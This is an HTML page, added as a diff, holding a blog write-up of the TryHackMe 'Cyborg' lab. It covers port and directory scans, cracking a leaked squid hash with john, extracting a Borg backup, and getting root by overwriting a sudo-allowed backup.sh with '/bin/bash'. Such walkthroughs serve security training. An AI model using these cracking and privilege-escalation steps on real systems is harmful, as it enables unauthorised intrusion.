@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cyborg | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2026-01-05</span>
+                <span>// ID: REF-Cyborg</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Cyborg</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtLmojJ45opVBHg89gyhjnTTwgEf8lVKKbUfVwmfqYP9gU3fWZD05rB/4p/qSoPbsGWvDUlSTUYMDcxNqaADH/nk58URDIiFMEM6dTiMa0grcKC5u4NRxOCtZGHTrZfiYLQKQkBsbmjbb5qpcuhYo/tzhVXsrr592Uph4iiUx8zhgfYhqgtehMG+UhzQRjnOBQ6GZmI4NyLQtHq7jSeu7ykqS9KEdkgwbBlGnDrC7ke1I9352lBb7jlsL/amXt2uiRrBgsmz2AuF+ylGha97t6JkueMYHih4Pgn4X0WnwrcUOrY7q9bxB1jQx6laHrExPbz+7/Na9huvDkLFkr5Soh
+|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB5OB3VYSlOPJbOwXHV/je/alwaaJ8qljr3iLnKKGkwC4+PtH7IhMCAC3vim719GDimVEEGdQPbxUF6eH2QZb20=
+|   256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlr5id6IfMeWb2ZC+LelPmOMm9S8ugHG2TtZ5HpFuZQ
+80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<pre class="codehilite"><code>└─$ dirsearch -u http://cybrog.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
+Target: http://cybrog.thm/
+
+[02:04:32] Starting: 
+[02:05:00] 301 -  308B  - /admin  -&gt;  http://cybrog.thm/admin/              
+Added to the queue: admin/
+[02:05:31] 301 -  306B  - /etc  -&gt;  http://cybrog.thm/etc/  
+</code></pre>
+
+<p>find out they are located in /etc/squid/squid.conf , gobuster picks up the <code>/etc</code> directory aswell so this is an alternate method.</p>
+<pre class="codehilite"><code>uth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd auth_param basic children 5 auth_param basic realm Squid Basic Authentication auth_param basic credentialsttl 2 hours acl auth_users proxy_auth REQUIRED http_access allow auth_users
+</code></pre>
+
+<pre class="codehilite"><code>music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+</code></pre>
+
+<pre class="codehilite"><code>HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+Possible Hashs:
+[+] MD5(APR)
+
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+squidward        (?)     
+</code></pre>
+
+<p>now we i have valid credintilas <code>music_archive:squidward</code></p>
+<p>I EXTRACT DOWNLOADED FILES USING THAT ADMIN PANNEL </p>
+<pre class="codehilite"><code>└─$  tar -xvf archive.tar                               
+home/field/dev/final_archive/
+home/field/dev/final_archive/hints.5
+home/field/dev/final_archive/integrity.5
+home/field/dev/final_archive/config
+home/field/dev/final_archive/README
+home/field/dev/final_archive/nonce
+home/field/dev/final_archive/index.5
+home/field/dev/final_archive/data/
+home/field/dev/final_archive/data/0/
+home/field/dev/final_archive/data/0/5
+home/field/dev/final_archive/data/0/3
+home/field/dev/final_archive/data/0/4
+home/field/dev/final_archive/data/0/1
+
+
+
+└─$ tree                 
+.
+└── field
+    └── dev
+        └── final_archive
+            ├── config
+            ├── data
+            │   └── 0
+            │       ├── 1
+            │       ├── 3
+            │       ├── 4
+            │       └── 5
+            ├── hints.5
+            ├── index.5
+            ├── integrity.5
+            ├── nonce
+            └── README
+
+6 directories, 10 files
+
+
+cat field/dev/final_archive/README
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+</code></pre>
+
+<p>This is just a type of backup software for compression. I just happened to stumble across this on github and thought it was cool.</p>
+<p>So their docs are <a href="https://borgbackup.readthedocs.io/">https://borgbackup.readthedocs.io/</a> lets check them out!</p>
+<p>We read the section on usage.</p>
+<p>You can see that in the Usage section there is a section on extracting with the following command <code>borg extract /path/to/repo::my-files</code></p>
+<p>We can get our path to repo by doing <code>pwd</code></p>
+<p>as for the my-files part this seems to be the music_archive that was mentioned earlier and as the username for the hash.</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/…/cyborg/home/field/dev]
+└─$ borg extract /home/kali/tryhackme/cyborg/home/field/dev/final_archive::music_archive
+Enter passphrase for key /home/kali/tryhackme/cyborg/home/field/dev/final_archive: 
+
+
+└─$ tree                       
+.
+└── alex
+    ├── Desktop
+    │   └── secret.txt
+    ├── Documents
+    │   └── note.txt
+    ├── Downloads
+    ├── Music
+    ├── Pictures
+    ├── Public
+    ├── Templates
+    └── Videos
+
+10 directories, 2 files
+</code></pre>
+
+<p>Goint trough root</p>
+<pre class="codehilite"><code>alex@ubuntu:/home$ cd alex
+alex@ubuntu:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+alex@ubuntu:~$ cat user.txt
+flag{1_hop3_y0u.......
+alex@ubuntu:~$ sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+alex@ubuntu:~$ ls -la /etc/mp3backups/backup.sh
+-r-xr-xr-- 1 alex alex 1083 Dec 30  2020 /etc/mp3backups/backup.sh
+alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
+#!/bin/bash
+
+sudo find / -name &quot;*.mp3&quot; | sudo tee /etc/mp3backups/backed_up_files.txt
+
+
+input=&quot;/etc/mp3backups/backed_up_files.txt&quot;
+#while IFS= read -r line
+#do
+  #a=&quot;/etc/mp3backups/backed_up_files.txt&quot;
+#  b=$(basename $input)
+  #echo
+#  echo &quot;$line&quot;
+#done &lt; &quot;$input&quot;
+
+while getopts c: flag
+do
+        case &quot;${flag}&quot; in 
+                c) command=${OPTARG};;
+        esac
+done
+
+
+
+backup_files=&quot;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3&quot;
+
+# Where to backup to.
+dest=&quot;/etc/mp3backups/&quot;
+
+# Create archive filename.
+hostname=$(hostname -s)
+archive_file=&quot;$hostname-scheduled.tgz&quot;
+
+# Print start status message.
+echo &quot;Backing up $backup_files to $dest/$archive_file&quot;
+
+echo
+
+# Backup the files using tar.
+tar czf $dest/$archive_file $backup_files
+
+# Print end status message.
+echo
+echo &quot;Backup finished&quot;
+
+cmd=$($command)
+echo $cmd
+alex@ubuntu:~$ chmod u+w /etc/mp3backups/backup.sh
+alex@ubuntu:~$ echo &quot;/bin/bash&quot; &gt; /etc/mp3backups/backup.sh
+alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh
+root@ubuntu:~# cd root
+bash: cd: root: No such file or directory
+root@ubuntu:~# cd ..
+root@ubuntu:/home# cd ..
+root@ubuntu:/# cd root
+root@ubuntu:/root# ls
+root.txt
+root@ubuntu:/root# cat root.txt
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
